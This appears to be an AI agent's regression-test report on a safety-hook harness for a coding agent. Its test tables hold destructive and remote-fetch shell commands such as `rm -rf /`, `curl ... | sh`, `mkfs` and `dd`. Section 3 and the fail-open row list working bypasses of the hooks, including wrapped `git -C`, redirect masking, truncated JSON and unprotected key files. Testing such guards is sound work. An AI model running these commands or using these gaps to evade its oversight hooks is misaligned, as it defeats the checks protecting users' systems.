# Harness non-regression battery: every gate except Bash-write (2026-11-11)

Agent: `gates-battery`. Mandate: prove that every gate/event other than the Bash-write gate behaves in the installed build exactly as in 0.1.115.

| Item | Value |
|---|---|
| Installed build under test | `~/.claude/plugins/marketplaces/fusengine-plugins/plugins/node_modules/@fusengine/harness/dist/cli/bin.mjs`, sha256 `3d38651f7db7c92c404e79ea5590474776f0283badeca1ab8845d714e8ac02cb` (source = commit `aa1d13c` on top of `ddcf2d7` = 0.1.117; the build still prints "v0.1.115" because `package.json` was not bumped) |
| Baseline | `dist.bak-2026-11-11-0115/cli/bin.mjs`, sha256 `5944a2ea9aacd221544ced9dff109b629b93e4ebcfe02488301958334dadf007` (0.1.115) |
| Start / end | 2026-11-11 16:33 CET / 17:15 CET |
| Layers | A = LIVE tool calls from this session (through the installed build's real hooks). B = REPLAY: the exact hook JSON piped to both binaries with `bun <bin> hook claude-code [scope]`, fresh `session_id`, isolated HOME per build and per case |
| Replay totals | 437 replay cases (final run per case id): 426 UNCHANGED, 11 DIFFERENT, of which 11 inside the Bash-write gate and 0 outside it. |
| Live totals | 17 live tool calls recorded in section 4 (all with cwd inside the scratch project or reading harness sources) |
| Repro | scratch dir `/private/tmp/claude-501/-Users-brunoazoulay-Labo-docker-lab-dev-local-Dev-ai-claude-code-claude-plugins/2723977a-20cc-47b1-bf76-10a7db930be8/scratchpad/battery-gates/` (`run.mjs`, `cases1..8.mjs`, `results*.json`, `out*.txt`, `gen.mjs`) |

## 0. Verdict

**Regressions found outside the Bash-write gate: none.** Every DIFFERENT line is inside the Bash-write gate (section 2) and is explained by the source diff (`aa1d13c`, plus `b36af37` which shipped in 0.1.116). Two further DIFFERENT lines seen during the run were artifacts, explained and re-run to UNCHANGED (section 1). Scope of the claim: one-process-at-a-time replay of every case, plus concurrent fan-out replay for PreToolUse/PostToolUse (section 3c). Challenger verdict: UNCERTAIN, only for the real parallel SessionStart/UserPromptSubmit path (race-dependent in both builds) and the lock-fairness change under heavy contention; no counter-example was found.

Method of replay: each case runs the same steps (PostToolUse set-up steps included, e.g. agents + docs + SOLID reads to authorise APEX, or a code Write to arm the release gate) against two isolated HOMEs, then compares every step's stdout, stderr and exit code after normalising HOME, session id, root path and timestamps. Replays use the real `core-guards`, `ai-pilot`, `claude-rules` (and the other plugins') invocation forms read from the installed `hooks.json` files (scopes: none, `core`, `core --sound stop|permission|human`, `rules`, `aipilot`, `solid`, `security`, `motion`, `carto`, `lessons`, `seo`, `changelog`, `tailwindcss`).

Passes: every case file was run twice, once with the installed build first and once with the 0.1.115 build first (`REV=1`), because the two builds share some on-disk state outside the isolated HOME (section 1). Reverse pass totals (cases 3-8 at 17:01-17:02, right after the forks recovered, with zero fork errors and zero `rc=null` in the files; cases 1-2 and the `L*` set after 17:04; ids appearing in two files counted twice): 442 UNCHANGED / 11 DIFFERENT (all 11 in the Bash-write gate: X01, X12, X13, X22, X27 and PB90, PB92, PB95, PB96, PB97, PB98), identical to the forward pass after the two explained artifacts of section 1. Latency was measured in both orders as well (section 5).

Ambient fact that matters for reading the table: `FUSE_SOLID_MAX_LINES=200` is set in this environment (SessionStart `solid` prints "max 200 lines"), so size cases without an `env` note run at 200. The default-100 boundary cases were re-run with the variable pinned (`*-100` ids).

## 1. Regression candidates (DIFFERENT outside the Bash-write gate)

None remain. Two transient DIFFERENT lines occurred and are explained:

1. **B01 / B11 (first run, `cases3`)**: the installed build (run first) printed an extra `📖 [Reference] <file> logged` system message on some PostToolUse Read steps; 0.1.115 (run second) did not. Cause: `src/runtime/lifecycle/auto-document-reads.ts` appends one line per reference file to the log `<project root of the read file>/.claude/apex/docs/task-1-<framework>.md`; the replayed Read paths were real skill files, so the "project root" is the real marketplace dir and the log is shared state outside the isolated HOME. First build to run logs the file, the second finds it already logged. Re-running B01 and B11 gave UNCHANGED for both builds and no further write (file mtime unchanged).
   **Side effect to disclose**: that first run appended 6 lines (`interface-segregation.md`, `factory.md`, `component.md`, `store.md`, `hook.md`, `adapter.md`, 15:41 UTC) to the existing real file `/Users/brunoazoulay/.claude/plugins/marketplaces/fusengine-plugins/.claude/apex/docs/task-1-generic.md`. This is the harness's own auto-journal (no secret), written by the hook in reaction to my replay payload; I did not edit or delete it and did not repeat it (every remaining reference name is already logged). Reported to `main` at 16:43.
2. **Second pass in reverse order (`REV=1`) of `cases4`: B28, B30 DIFFERENT with `rc=null`**: the process table of uid 501 was saturated (`ps` showed 10683 processes against `kern.maxprocperuid=10666`, `fork failed: resource temporarily unavailable`), so some replay spawns failed. Environmental, not a harness verdict. Per `main`, the cause was a recursive `git commit -qm pwn` (core.fsmonitor) from a fuzz repo of another session, not this battery (resolved, 734 processes afterwards). Because replays measured between ~16:43 and ~17:15 may have been affected, **every case and the latency series were re-run after recovery (17:04-17:08)**: forward pass 8 case files + the lifecycle `L*` set, all with zero fork errors and zero `rc=null`; the tables below are from that re-run only. 

## 2. DIFFERENT lines inside the Bash-write gate (expected, owned by `bw-battery`; listed for completeness, not counted as regressions)

Source explanation: `aa1d13c` adds `literalWriteBlock` (literal text written through the shell to a non-code file: ask becomes block) and `commandOutputOnlyInTemp` (a read-only producer's output landing strictly in scratchpad / system temp: ask becomes allow) in `src/policy/guards/bash-write.ts` lines ~130-160. `b36af37` (in 0.1.116, so also between 0.1.115 and the installed build) ends `/dev/null` and fd-dup redirect targets at a glued closing paren in `src/policy/guards/bash-write-redirect-op.ts` (`readTarget(..., stopParen)`): `(cmd >/dev/null)` stops being asked.

- **X01** (interplay: new allow path): git status > /tmp (read-only producer to temp)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **X12** (interplay: bash-write itself): ls > /tmp (changed gate: expected DIFFERENT)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **X13** (interplay: bash-write itself): echo hi > notes.txt (changed gate: expected DIFFERENT)
  - installed: `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"[BLOCKED] Bash write of literal text\nBash file write of literal text — use the Write tool to create/overwrite notes.txt, or the Edit tool to append/change it\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"✘ Bash write of literal text"}`
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **X22** (interplay: new allow path): ls > /tmp 2>&1
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **X27** (interplay: new allow path): cat src/a.ts > /tmp
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **PB90** (protected redirect NEG): (cat src/a.ts >/dev/null)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **PB92** (protected redirect NEG): echo x >/dev/null)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **PB95** (protected redirect NEG): (grep x .claude/apex/ >/dev/null)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **PB96** (protected redirect NEG): cat .claude/apex/x >/dev/null)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **PB97** (protected redirect NEG): (echo x 2>&1)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`
- **PB98** (protected redirect NEG): (ls 2>/dev/null)
  - installed: (empty stdout, exit 0 = allow)
  - 0.1.115:  `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"ask","permissionDecisionReason":"[CONFIRM] Bash file write\nShell redirect to file detected. Authorize?\nNext:\n 1. Use the Write/Edit tool instead"},"systemMessage":"? Bash file write"}`

Cross-check of the build contents: the `dist` of both builds, concatenated with chunk hash suffixes stripped, differs by 130 removed / 580 added lines in 37 hunks. Hunks by source region (from the `//#region` markers): 25 are in the Bash-write family (`bash-write.ts`, `bash-write-literal*.ts`, `bash-write-output-window.ts`, `bash-write-scratchpad*.ts`, `bash-write-redirect-op.ts`) and 2 are the `payloadCwd` plumbing in `runtime/handle-pre.ts` and `runtime/gate.ts` (the new value is read only by `bash-write`). The other 10 hunks are not gates and none alters a verdict, but two are behavioural changes that predate `aa1d13c` (0.1.116/0.1.117) and that sequential replays cannot exercise:
- `runtime/lifecycle/snapshot/git.ts` + `config/env.ts`: the SessionStart git-snapshot per-call timeout is now `parseEnvInt(FUSE_SNAPSHOT_GIT_TIMEOUT_MS, 150)` (default unchanged, 150 ms).
- `tracking/track-lock-sync.ts`: after a contended lock release a process sleeps 1-4 ms ("step aside") before re-taking it; uncontended callers never pay it.
- Chunk re-export reordering only: `cli/hook-run.ts`, `cli/run.ts`, `cli/hook-legacy.ts`, `refs/router.ts`.

## 3. Pre-existing behaviours seen (UNCHANGED in both builds, worth the owner's attention)

- **Wrapped git bypass**: `git -C x commit -m t` and `git -C x push --force` produce **no verdict at all** in both builds (G12, G14) while the bare forms ask/deny. This is the known gap fixed by the unmerged `fix/git-rm-patterns` branch, not in this build.
- **A redirect ask masks a deny**: `git push --force origin x > /tmp/f` and `git reset --hard > /tmp/f` return only the Bash-write ask in both builds (X17, X18, X26, X02), because the guard chain is security, protected-path, bash-write, interface-separation, install and the first hit wins; the GIT_BLOCKED deny is never evaluated. The critical security patterns and protected paths stay deny (X04, X09, X28, X29, X10, X11).
- **Bash-write false positive** (live, twice): a command containing `sed -n 1,60p file; grep -rn "store" a/*.ts b/*.ts -il | head` is denied "sed in-place edit" (LS1e; the grep flag `-il` is read as sed `-i`); a read-only `python3 - <<'EOF'` script is denied "Python heredoc input" (LS2). Both builds identical. Bisect: `sed -n` alone, the `grep ... | head` alone and the pair `grep; sed -n` are allowed; only `sed -n` followed by `grep -rn ... -il` is denied.
- **`~/.fuse-harness/.key` and `state/` are not protected at Write/Edit in this build** (P08, P09 allow in core and motion scope). `PROTECTED_FRAGMENTS` covers `.fuse-harness/cache/sessions`, `video-motion/` and `video-motion/keys/` only; the Motion key guard itself is verified (MK01-MK16 deny, MK90-MK96 allow). The state/key protection is in the unmerged `test/receipt-tamper` work.
- **NotebookEdit / MultiEdit**: absent at `aa1d13c`. `grep` over `src` and over the commit tree finds the names only in `policy/motion/constants.ts`, `runtime/motion/pre.ts` and `runtime/lifecycle/agent-files.ts` (motion scope and file listing), none in the core chain. In addition the installed `core-guards` PreToolUse matcher is `Write|Edit|Bash|WebFetch|mcp__context7__query-docs|mcp__exa__web_search_exa|mcp__exa__get_code_context_exa` (no MultiEdit, NotebookEdit, Agent) and `ai-pilot` routes `Task` only, so the claude-plugins matcher fix (`d87d2d87`) is not installed. Replay of those payloads (N01-N12): `NotebookEdit` on a protected path is allowed in both builds (N02), `MultiEdit` on a protected path is allowed (N05) while a `MultiEdit` is size/APEX-gated like an Edit (N04, N06). All UNCHANGED.
- **Ask verdicts are not always visible live**: `echo 'rm -rf /'` is a replay `ask` (the `rm\s` pattern) yet ran without a prompt in this session (LV01). The ask is resolved by Claude Code's permission layer for this agent, not by the harness; replay is the only reliable way to observe ask.
- **Version string**: SessionStart snapshot of the installed build reports `harness running: v0.1.115` (O21), identical to the baseline; identify the build by sha256.

## 3c. Parallel fan-out replay (added after challenger review)

Real Claude Code launches every plugin hook of one event at once (13 bare `hook claude-code` commands plus the scoped ones). `par.mjs` launches that fan-out concurrently (21 processes for PostToolUse, 16 for PreToolUse, 13 for SessionStart/UserPromptSubmit) against one HOME and session per build, twice, and compares the multiset of outputs and the state tree (`results-par.json`, builds run one after the other):

| Event | Run 1 | Run 2 |
|---|---|---|
| PostToolUse Write (a.ts) | same outputs, same state (10 distinct outputs each) | same |
| PostToolUse Read | same outputs, same state | same |
| PreToolUse Write b.ts (APEX deny) | same outputs, same state | same |
| PreToolUse Bash `rm -rf /` | same outputs, same state | same |
| PreToolUse Bash `git commit` (ask) | same outputs, same state (wall 1.8 s new / 1.6 s old for the 16 processes, both slow, pre-existing) | same (1.6 / 1.8 s) |
| UserPromptSubmit | outputs differ (1 injecting sibling + 12 silent in both builds; which fragment mix differs) | same |
| SessionStart | outputs and state names differ | differ |

SessionStart/UserPromptSubmit under 13-way concurrency are race-dependent in **both** builds (the installed run gave 3 distinct output variants, 0.1.115 gave 3 then 4; sibling dedup slots `inject-session/<sid>/7` vs `8` change from run to run), so the difference is the dedup race, not a build difference; a deterministic comparison needs the sequential `E-*` cases above, which are byte-identical. The verdict of section 0 therefore covers sequential replay plus the deterministic fan-out events (PreToolUse/PostToolUse); the journal-lock fairness change (section 2) was running in those fan-outs without any visible effect, but contention-heavy timing is still not quantified.

## 3b. Result summary by gate (replay unless stated)

| Gate / event | Triggering cases | Negative controls | Result |
|---|---|---|---|
| Security guard, critical (`rm -rf /`, `~`, `/etc`, `/usr/local`, `-fr /`, sudo, curl\|sh, mkfs, dd of=/dev/disk, chmod 777 /, fork bomb) | S01-S11 deny | S90-S95 allow | UNCHANGED |
| Security guard, ask (plain rm, `rm -rf node_modules`, `rm -rf dist`, temp dirs, unlink, chmod 777, eval, chown -R, tee /etc, trash exemption S17) | S12-S22 ask | same | UNCHANGED |
| Git gate (add, commit, push, force-push, `-f`, `--force-with-lease`, reset, `reset --hard`, clean -fd, branch -D, rebase, wrapped `git -C`, `bash -c`, `cd x &&`, `env`, subshell, protected-branch cwd) | G01-G24 | G90-G97 allow (G96 `-f` substring branch name asks, same in both) | UNCHANGED |
| Install guard (npm, bun, pip, brew, apt, cargo; RALPH_MODE project auto-approve, system still asks) | I01-I11 | I90-I93 | UNCHANGED |
| Release gate (`gh pr merge`, `git tag`, wrapped, after a code edit; none before) | R01, R02, R05, R06 ask | R03 (no code edit in session), R04 (`git tag -l`), R07 (`gh pr view`) allow | UNCHANGED |
| Protected paths Write/Edit/Bash (marketplaces, cache, sessions, `.claude/apex`, `.claude/logs/00-apex`, `.git`, `.harness/track`, `.codex/config.toml`) | P01-P07, P10-P13, PB01-PB15, X10, X11 deny | P90-P94, PB91-PB94 allow | UNCHANGED |
| APEX authorization (agents + docs + SOLID refs), fast path for trivial Edit (<5 lines, budget), non-trivial Edit, replace_all, skip dirs, non-code, React doc | A01-A12, AU01-AU19, B01-B24 | B01, B02, B18, B21, B22 allow | UNCHANGED (B01/B11 see section 1) |
| Freshness TTL (`FUSE_ENFORCE_TTL_SEC=2` + 3.5 s sleep) | AU14, B17 deny | AU15, B18 allow | UNCHANGED |
| SOLID file-size (default 100 pinned, 200 ambient, 50, 3; boundary 100/101, Edit growth, Explore exempt) | B04, B05, B07, B09, B16, B04-100... | B02, B03, B06, B21 | UNCHANGED |
| Store budget (40 at 100, 20 at 50, 80 at 200) and store location, hook location, interface in component | B12, B15, B25, B27, B28, B30 and `*-100` | B13, B14, B26, B29 | UNCHANGED |
| Deny-loop (same deny x6), one-shot crediting (deny, authorize, same-key allow, different file, abandoned, no phantom credit, SessionStart summary) | D01-D03, O01-O16, O21 | O04, O14 | UNCHANGED (`one-shot.json` byte-identical) |
| Web/MCP gates (WebFetch, context7, exa: first call allowed, repeat after Post = CACHE HIT deny) | W01-W08 | n/a | UNCHANGED |
| Motion key guard (core + motion scope) and `video-motion/keys` | MK01-MK16 (deny) | MK90-MK96, and M01-M10 (they target `~/.fuse-harness/.key`/`state`, which the motion scope does not guard: allow in both, so they are extra negatives, not triggers) | UNCHANGED |
| Read gates (PreToolUse Read, PostToolUse Read credit, ref logging, security/motion scopes) | RD01-RD07 | n/a | UNCHANGED |
| NotebookEdit / MultiEdit / Agent / Task payloads | N01-N12 | N08-N12 | UNCHANGED (normalisation absent at `aa1d13c`, see section 3) |
| PostToolUse sniper reminder (the PT04 "size warning" variant produced the same plain reminder as PT01: the PostToolUse size-warning path is not exercised), aipilot/solid/lessons/carto/seo/changelog/tailwindcss/motion post scopes, PostToolUseFailure | PT01-PT16 | PT03 | UNCHANGED |
| SessionStart / UserPromptSubmit / SubagentStart injection (scopes none, rules, carto, solid, lessons, motion) | E-*, L07-L12, O21, O22 | n/a | UNCHANGED, byte-identical (sizes below) |
| Stop / SubagentStop / SessionEnd / TeammateIdle / TaskCompleted / PreCompact / InstructionsLoaded / Notification / PermissionRequest | E-*, L01-L06 (stop gate "VERIFICATION RECEIPT REQUIRED" after a code write) | n/a | UNCHANGED |
| Fail-open / fail-closed (not JSON, empty, whitespace, null, array, `{}`, missing tool_input, number command, missing file_path, unknown event, bad/missing session id, missing cwd, truncated JSON, >1 MB payload) | Z01-Z17 | n/a | UNCHANGED: malformed or empty stdin = exit 0, no output (fail-open); a well-formed dangerous Bash with bad/missing session id or cwd or 1.2 MB padding still denies (Z11-Z13, Z17); truncated JSON containing `rm -rf /` is allowed in both (Z14) |
| Shared redirect tokenizer consumers (`protected-path`, motion `shell-targets`, `shell-read-refs`, glued parens) | PB01-PB15, MK13-MK15, RR01-RR05 | PB91-PB94 | UNCHANGED (only the Bash-write `(cmd >/dev/null)` asks changed, section 2) |
| Interplay: other gates behind a redirect (git block/ask, install, release, security ask/critical, protected path) | X02-X11, X15-X21, X23-X26, X28-X30, X40-X49 | n/a | UNCHANGED (no other gate is masked or weakened more than in 0.1.115) |

Injection sizes (chars of the normalised stdout; identical bytes in both builds):

| id | installed chars | 0.1.115 chars | class |
|---|---|---|---|
| E-SessionStart-core | 623 | 623 | UNCHANGED |
| E-SessionStart-carto | 337 | 337 | UNCHANGED |
| E-SessionStart-lessons | 0 | 0 | UNCHANGED |
| E-SessionStart-rules | 9101 | 9101 | UNCHANGED |
| E-SessionStart-solid | 38 | 38 | UNCHANGED |
| E-UserPromptSubmit-core | 6828 | 6828 | UNCHANGED |
| E-UserPromptSubmit-lessons | 0 | 0 | UNCHANGED |
| E-UserPromptSubmit-motion | 0 | 0 | UNCHANGED |
| E-UserPromptSubmit-rules | 7374 | 7374 | UNCHANGED |
| E-SubagentStart-core | 0 | 0 | UNCHANGED |
| E-SubagentStart-aipilot | 0 | 0 | UNCHANGED |
| E-SubagentStart-lessons | 0 | 0 | UNCHANGED |
| E-SubagentStart-motion | 0 | 0 | UNCHANGED |
| E-SubagentStart-rules | 9102 | 9102 | UNCHANGED |
| L07 | 10116 | 10116 | UNCHANGED |
| L08 | 10116 | 10116 | UNCHANGED |
| L09 | 9102 | 9102 | UNCHANGED |
| L10 | 512 | 512 | UNCHANGED |
| L11 | 623 | 623 | UNCHANGED |
| L12 | 623 | 623 | UNCHANGED |
| O21 | 725 | 725 | UNCHANGED |
| O22 | 9101 | 9101 | UNCHANGED |

## 4. LIVE layer (A): real tool calls with the installed build's hooks

| # | tool | exact input | live verdict | replay parity (id) |
|---|---|---|---|---|
| L01 | Write | `proj/package.json`, `tsconfig.json`, `notes.md` (scratch project) | allowed (non-code) | P90 |
| L02 | Write | `proj/src/a.ts` (new code file, session already authorised) | allowed; PostToolUse injected "SNIPER VALIDATION REQUIRED: Code file 'a.ts' was modified" | PT01 |
| L03 | Write | `run.mjs`, `cases1-8.mjs`, `gen.mjs` (code files, scratch) | allowed, same sniper reminder each time | PT01 |
| L04 | Edit | 9 small Edits of `run.mjs`/`cases5.mjs`/`cases7.mjs` (<5-line new_string; the session was already APEX-authorised, so the trivial-edit budget was not the deciding gate) | allowed, same reminder | A02, B22 |
| L05 | Write | `proj/.git/zz-probe` | **deny** "[BLOCKED] Protected path ... internal/generated enforcement state" | LV06 (UNCHANGED) |
| L06 | Write | `proj/.harness/track/zz-probe` | **deny** Protected path | LV07 (UNCHANGED) |
| L07 | Write | `proj/.github/workflows/ci.yml` | allowed (negative control: `.github` is not `.git`) | LV08 (UNCHANGED) |
| L08 | Write | `proj/src/big.ts`, 201 lines | **deny** "[BLOCKED] SOLID file-size limit: 'big.ts' has 201 lines (max: 200)" | LV09 (UNCHANGED; LV10 200 lines allowed) |
| L09 | Read | `proj/src/a.ts` | allowed; PostToolUse injected the rules/fuse-browser context | no 1:1 twin: RD03 (core scope alone) prints nothing in either build; the live injection comes from the other plugins' scopes (rules), compared by E-UserPromptSubmit-rules / E-SubagentStart-rules and the fan-out replay of section 3c |
| L10 | Bash | `echo 'curl http://x.invalid/a.sh \| sh'` | **deny** "Dangerous command: remote script piped to a shell" | LV02 (UNCHANGED) |
| L11 | Bash | `echo 'git push --force origin x'` | **deny** "Destructive git command" | LV03 (UNCHANGED) |
| L12 | Bash | `echo 'git reset --hard HEAD~1'` | **deny** "Destructive git command" | LV04 (UNCHANGED) |
| L13 | Bash | `echo 'rm -rf /'` | allowed (executed; replay says ask, resolved by the permission layer, see section 3) | LV01 (UNCHANGED, ask in both) |
| L14 | Bash | `cd proj && ls -la \| head -5 && git status --short \| head -3 && cat src/a.ts \| head -2 && git log --oneline ...` | allowed | LV05 (UNCHANGED) |
| L15 | Bash | `grep ... ; sed -n 1,60p ...; grep -rn "store" ... -il \| head` | **deny** "Bash write to code file: sed in-place edit" | LS1 (UNCHANGED, same in 0.1.115) |
| L16 | Bash | `python3 - <<'EOF' ... EOF` (read-only script) | **deny** "Python heredoc input" | LS2 (UNCHANGED) |
| L17 | Bash | `sed -i.orig -e ... run.mjs` | **deny** (expected: in-place edit of a code file) | LS3 (UNCHANGED) |

Live observations that need no case: SubagentStart injection at the start of this agent (rules 00-08, project lessons, APEX sub-agent instructions) and PostToolUse Read/Write context injection were delivered by the installed build and match the replay shapes (E-SubagentStart-rules, RD03, PT01). Live was not used for anything destructive, nor for ask verdicts, nor for protected paths outside the scratch project.

## 5. Hook latency (median of 5 runs per event, `bun` process wall time incl. startup)

Two passes, the second with the build order reversed to cancel ordering/load bias. These are the post-saturation numbers (17:05-17:08, 734 processes on the host). A first latency series taken during the saturation window (~16:43-17:15, SessionStart core 105/115 ms, one 179 ms outlier) was discarded and replaced by this one, as requested by `main`.

| id | event | installed ms (5 runs) | median | 0.1.115 ms (5 runs) | median | REV order medians (inst / 0.1.115) |
|---|---|---|---|---|---|---|
| LT01 | PreToolUse Bash ls (core) | 35, 35, 34, 33, 35 | 35 | 36, 38, 36, 35, 35 | 36 | 33 / 57 |
| LT02 | PreToolUse Bash rm -rf / (deny) | 36, 50, 42, 35, 33 | 36 | 34, 34, 33, 33, 33 | 33 | 33 / 32 |
| LT03 | PreToolUse Write notes.md | 32, 31, 32, 32, 32 | 32 | 32, 32, 32, 31, 32 | 32 | 33 / 35 |
| LT04 | PreToolUse Write code src/b.ts (APEX deny) | 34, 34, 35, 34, 35 | 34 | 34, 34, 35, 34, 34 | 34 | 36 / 35 |
| LT05 | PostToolUse Write code (sniper reminder) | 33, 32, 33, 32, 33 | 33 | 32, 33, 33, 33, 33 | 33 | 33 / 34 |
| LT06 | PostToolUse Read src/a.ts | 27, 28, 28, 29, 28 | 28 | 28, 27, 27, 28, 28 | 28 | 32 / 31 |
| LT07 | SessionStart core | 75, 74, 74, 74, 73 | 74 | 75, 73, 75, 74, 74 | 74 | 85 / 80 |
| LT08 | SessionStart rules | 41, 43, 41, 41, 41 | 41 | 43, 41, 41, 43, 41 | 41 | 44 / 44 |
| LT09 | UserPromptSubmit core | 30, 30, 30, 30, 30 | 30 | 31, 29, 30, 30, 29 | 30 | 31 / 62 |
| LT10 | UserPromptSubmit rules | 42, 42, 42, 43, 42 | 42 | 42, 42, 42, 41, 42 | 42 | 42 / 44 |
| LT11 | SubagentStart rules | 42, 42, 41, 41, 43 | 42 | 42, 44, 42, 41, 41 | 42 | 46 / 43 |
| LT12 | SubagentStop core | 28, 29, 28, 28, 28 | 28 | 29, 28, 28, 28, 29 | 28 | 31 / 31 |
| LT13 | Stop core | 27, 27, 26, 26, 26 | 26 | 26, 26, 26, 27, 27 | 26 | 27 / 28 |
| LT14 | PreToolUse Bash ls (motion scope) | 28, 28, 28, 28, 28 | 28 | 28, 28, 28, 28, 28 | 28 | 29 / 35 |
| LT15 | PreToolUse Edit trivial (fast path) | 33, 33, 34, 33, 34 | 33 | 34, 33, 33, 33, 34 | 33 | 34 / 35 |
| LT16 | malformed stdin (not JSON) | 31, 31, 31, 30, 31 | 31 | 30, 31, 30, 31, 31 | 31 | 32 / 32 |

Reading: PreToolUse/PostToolUse medians are 26-36 ms for both builds, SessionStart core 74-85 ms, rules injections 41-46 ms; installed and 0.1.115 agree within a few ms in both orders (the few 2x differences, e.g. LT01 33 vs 57 or LT09 31 vs 62 in the reversed pass, hit the baseline build and are not mirrored in the forward pass: single-run noise on a shared host). No event shows a latency regression of the installed build.

## 6. NOT MEASURED (with reason)

- Gates with no replay case: `designGate`/design files gate, framework skill gates (shadcn, tailwind, react skill read), `gemini-mcp-gate`, DRY grep, PRD gates. Evidence for them is only that the normalised dist diff has no hunk in their source regions (section 2); no behavioural comparison was run.

- Any live `ask` verdict, and any live destructive command (`rm -rf` forms, force-push, `git reset --hard`, `git commit/add/push`, installs, `gh pr merge`, `git tag`): forbidden by the mandate or would need the owner to answer; covered by replay only.
- Live NotebookEdit / MultiEdit / Agent routing: those tools are not offered to this agent and the installed `core-guards` matcher excludes them; replay only.
- Live protected-path Write outside the scratch project (marketplaces, cache, `.fuse-harness/**`): forbidden (would write under `~/.claude` / `~/.fuse-harness` if a regression allowed it); replay only.
- Other hosts (Codex 0.1.115, Kimi/Cursor 0.1.110 copies of the harness): different installs, not touched.
- `hook` runs under `node` (hooks.json uses `bun`): not run.
- Concurrent-sibling behaviour of the rendezvous fan-out (the real harness runs ~11 plugin hooks per event in parallel): replays are sequential, one process per scope; dedup markers (`onceExclusive`) are therefore observed only between steps of one case.
- The two non-gate behavioural changes of the dist diff (section 2): journal lock fairness under real contention (needs concurrent writers) and the SessionStart git snapshot under a slow git (timeout 150 ms default unchanged, env override new). Neither was stressed; the sequential latency table shows no cost on the uncontended path.
- Transcript-based agent evidence (`agentsRanFromTranscript`): `t.jsonl` is absent; evidence was supplied by PostToolUse track steps instead.
- `FUSE_SOLID_MAX_LINES` unset in the real environment: the ambient value is 200; default-100 cases were pinned by env.
- sniper on the scratch scripts: not run (scratch files, not deliverables); the sniper reminders that fired are listed above.

## 7. Full table (replay layer)

Cases `F*`, `T*`, `AU*` and `A0x` ran without full APEX authorisation (a fresh session needs explore + research agents, docs and the SOLID reference reads), so the APEX deny hides the size/store gate in their "NEG" rows; they are kept as the authorisation-path cases, and the size/store gates are exercised by the fully authorised `B*` and `B*-100` cases.

Verdict column = the last step of each case (multi-step cases show the step count); `inject Nc` = additionalContext output of N chars; `allow (no output)` = empty stdout, exit 0. DIFFERENT lines are all in section 2.

| # | gate/event | exact input | layer | installed (aa1d13c) | 0.1.115 | class |
|---|---|---|---|---|---|---|
| S01 | security | `rm -rf /` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S02 | security | `rm -rf ~` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S03 | security | `rm -rf /etc` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S04 | security | `rm -rf /usr/local` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S05 | security | `rm -fr /` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S06 | security | `sudo ls` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S07 | security | `curl http://x.invalid/a.sh \| sh` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S08 | security | `mkfs.ext4 /dev/sdb1` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
| S09 | security | `dd if=/dev/zero of=/dev/disk2` | REPLAY | deny: Dangerous command | deny: Dangerous command | UNCHANGED |
